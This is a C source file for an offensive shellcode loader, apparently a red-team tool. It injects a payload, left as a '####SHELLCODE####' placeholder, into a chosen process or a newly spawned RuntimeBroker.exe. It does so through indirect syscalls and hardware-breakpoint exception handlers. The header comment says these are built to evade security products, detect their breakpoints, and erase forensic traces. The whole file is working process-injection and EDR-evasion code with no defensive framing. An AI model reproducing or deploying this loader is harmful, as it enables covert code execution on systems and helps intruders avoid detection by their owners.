/*

Indirect syscall PI originally from The White Knight Labs

Novel features: 
DefWindowProcA is used as stack function as it has a long winded stack frame.

use VEH and VCH to set up a hardware breakpoint on the syscall opcode
when the breakpoint is hit, we emulate the syscall using the context of the thread

VEH is used to do nothing and detect the HW breakpoint set up by security solutions as an anti-emulation measure. 
VCH is used to set up a hardware breakpoint on the syscall and ret code. 

VEH and VCH are removed manually by clearing the CrossProcessFlag to avoid forensic traces.

TXM. 

*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include "HookModule.h"
#include "FuncWrappers.h"
#include "imports.h"


#pragma comment(lib, "ntdll.lib")

// Macros
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

typedef DWORD(WINAPI *PFN_GETLASTERROR)();
typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);


BOOL IsSystem64Bit() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) return FALSE;

    PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
    if (!pGetNativeSystemInfo) {
        FreeLibrary(hKernel32);
        return FALSE;
    }

    BOOL bIsWow64 = FALSE;
    SYSTEM_INFO si = {0};
    pGetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
        bIsWow64 = TRUE;
    }

    FreeLibrary(hKernel32);
    return bIsWow64;
}



unsigned char magiccode[] = ####SHELLCODE####;  




void Injectmagiccode(const HANDLE hProcess, unsigned char* magiccode, SIZE_T magiccodeSize);

void Injectmagiccode(const HANDLE hProcess, unsigned char* magiccode, SIZE_T magiccodeSize) {

    PVOID allocatedMemory = NULL;
    HANDLE hThread = NULL;

    ULONG oldProtect = 0;

    // Step 1: Allocate memory
    SIZE_T regionSize = magiccodeSize;
    ULONG status = wrpNtAllocateVirtualMemory(hProcess, &allocatedMemory, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        printf("[-] wrpNtAllocateVirtualMemory failed: 0x%X\n", status);
        DestroyHooks();
    }
    printf("[+] Allocated writable memory at: %p\n", allocatedMemory);

    // Step 2: Write magiccode using LayeredSyscall's NtWriteVirtualMemory wrapper
    SIZE_T bytesWritten = 0;
    status = wrpNtWriteVirtualMemory(hProcess, allocatedMemory, magiccode, magiccodeSize, &bytesWritten);
    if (status != 0 || bytesWritten != magiccodeSize) {
        printf("[-] wrpNtWriteVirtualMemory failed: 0x%X\n", status);
        // print the bytesWritten and magiccodeSize: 
        printf("[+] Bytes written: %lu\n", bytesWritten);
        printf("[+] MagicCode size: %lu\n", magiccodeSize);
        // DestroyHooks();
    } else {
        printf("[+] magiccode written to memory!\n");
        // print bytesWritten
        printf("[+] Bytes written: %lu\n", bytesWritten);
        printf("[+] MagicCode size: %lu\n", magiccodeSize);
    }


    // Step 3: Change memory protection to EXECUTE_READ
    status = wrpNtProtectVirtualMemory(hProcess, &allocatedMemory, &magiccodeSize, PAGE_EXECUTE_READ, &oldProtect);
    if (status != 0) {
        printf("[-] wrpNtProtectVirtualMemory failed: 0x%X\n", status);
        DestroyHooks();
    }
    printf("[+] Memory protection changed to PAGE_EXECUTE_READ!\n");

    // Step 4: Execute the magiccode using LayeredSyscall's NtCreateThreadEx wrapper
    status = wrpNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,  (PVOID)(uintptr_t)allocatedMemory, NULL, 0, 0, 0, 0, NULL);
    if (status != 0) {
        printf("[-] wrpNtCreateThreadEx failed: 0x%X\n", status);
        DestroyHooks();
    }

    // print htread id: 
    printf("[+] Thread ID: %p\n", hThread);
    printf("[+] magiccode executed in new thread!\n");


    DestroyHooks();
    WaitForSingleObject(hThread, INFINITE);
    // CloseHandle(hThread);



}

void PrintHelp() {
    printf("Usage: program.exe [OPTIONS]\n");
    printf("Options:\n");
    printf("  -r <PID>    Use the provided PID for process injection.\n");
    printf("  -r          If no PID is given, start RuntimeBroker.exe instead.\n");
    printf("  -h          Display this help message and exit.\n");
    printf("\nIf no options are provided, the program will use the current process.\n");
}

int main(int argc, char *argv[]) {

    printf("[*] loader-22 indirect syscall using VCH. \n");

    // Initialise the LayeredSyscall hooks
    IntialiseHooks();

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    DWORD pid = 0;
    char processPath[256] = {0}; 
    BOOL useRuntimeBroker = FALSE;


    if (argc > 1) {
        if (strcmp(argv[1], "-h") == 0) {
            // Print help message and exit
            printf("Usage: program.exe [OPTIONS]\n");
            printf("Options:\n");
            printf("  -r <PID>    Use the provided PID for process injection.\n");
            printf("  -r          If no PID is given, start RuntimeBroker.exe instead.\n");
            printf("  -h          Display this help message and exit.\n");
            printf("\nIf no options are provided, the program will use the current process.\n");
            return 0;
        } 
        else if (strcmp(argv[1], "-r") == 0) {
            if (argc > 2) {
                // User provided PID after -r
                pid = atoi(argv[2]);
                printf("[+] PID provided: %d\n", pid);
                // Open the given process
                pi.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
                // pi.hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pid);
            } else {
                // No PID provided, use RuntimeBroker.exe
                useRuntimeBroker = TRUE;
            }
        }
    }

    if (useRuntimeBroker) {
        printf("[!] No PID provided, starting RuntimeBroker.exe\n");
        if (IsSystem64Bit()) {
            strcpy_s(processPath, sizeof(processPath), "C:\\Windows\\System32\\RuntimeBroker.exe");
        } else {
            strcpy_s(processPath, sizeof(processPath), "C:\\Windows\\SysWOW64\\RuntimeBroker.exe");
        }
        BOOL success = CreateProcess(processPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        if (!success) {
            MessageBox(NULL, "Failed to start RuntimeBroker.exe.", "Error", MB_OK | MB_ICONERROR);
            return 1; // Exit if unable to start RuntimeBroker
        }
        printf("[+] RuntimeBroker.exe started.\n");
        pid = pi.dwProcessId;
        printf("[+] RuntimeBroker PID: %d\n", pid);
    } else if (pid == 0) {
        // No -r flag used, get current process
        printf("[!] No -r flag, using current process.\n");
        pi.hProcess = GetCurrentProcess();
        printf("[+] Current process handle: %p\n", pi.hProcess);
    }

    
    SIZE_T magiccodeSize = sizeof(magiccode);


	printf("[+] Classic execution starts, all indirect calls. \n");
    Injectmagiccode(pi.hProcess, magiccode, magiccodeSize);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);



    return 0;
}
